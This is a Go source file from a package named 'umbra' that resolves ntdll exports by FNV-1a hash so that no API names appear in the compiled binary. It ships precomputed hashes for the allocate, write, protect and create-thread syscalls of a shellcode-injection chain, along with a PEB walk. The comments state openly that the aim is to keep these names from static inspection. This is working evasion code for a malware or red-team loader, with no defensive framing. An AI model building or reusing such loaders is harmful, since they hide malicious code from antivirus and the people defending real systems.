package umbra

// umbra identifies ntdll exports by hash instead of by name so that no API
// string lands in the binary. FNV-1a 64 is used because it is trivial to
// reproduce, has excellent avalanche for short ASCII inputs and needs no
// runtime state.
//
// Important: Hash is meant to be evaluated at runtime only over names that are
// read from the in-memory ntdll export table. Callers must NOT build a hash
// from a string literal -- the literal would be compiled into the binary and
// defeat the whole point. Use the precomputed constants below instead; the
// plaintext they stand for is only in a comment, never in a Go string.

const (
	fnvOffset64 uint64 = 0xcbf29ce484222325
	fnvPrime64  uint64 = 0x00000100000001b3
)

// Precomputed FNV-1a 64 hashes (case-folded) of the services this project calls
// plus the ntdll module name used by the PEB walk. Keeping them numeric means
// the plaintext names never become Go string literals in the compiled output.
const (
	HashAllocVM       uint64 = 0x7fbaa47e01567ab8 // ntallocatevirtualmemory
	HashWriteVM       uint64 = 0xdfa9aafaa5c20bd2 // ntwritevirtualmemory
	HashProtectVM     uint64 = 0xd41db76fff717726 // ntprotectvirtualmemory
	HashCreateThread  uint64 = 0x756612a979b9455a // ntcreatethreadex
	HashWaitForObject uint64 = 0x7be490d25890b00e // ntwaitforsingleobject
	HashFreeVM        uint64 = 0xf51d1e0e44280c07 // ntfreevirtualmemory
	HashNtdll         uint64 = 0xbb7bb9a74c2f14fb // ntdll.dll
)

// Hash returns the FNV-1a 64-bit hash of name. ASCII upper-case letters are
// folded to lower case so that lookups are insensitive to the casing used by
// the caller (ntdll exports vary between Nt/Zw and their mixed-case aliases).
func Hash(name string) uint64 {
	h := fnvOffset64
	for i := 0; i < len(name); i++ {
		c := name[i]
		if c >= 'A' && c <= 'Z' {
			c += 'a' - 'A'
		}
		h ^= uint64(c)
		h *= fnvPrime64
	}
	return h
}
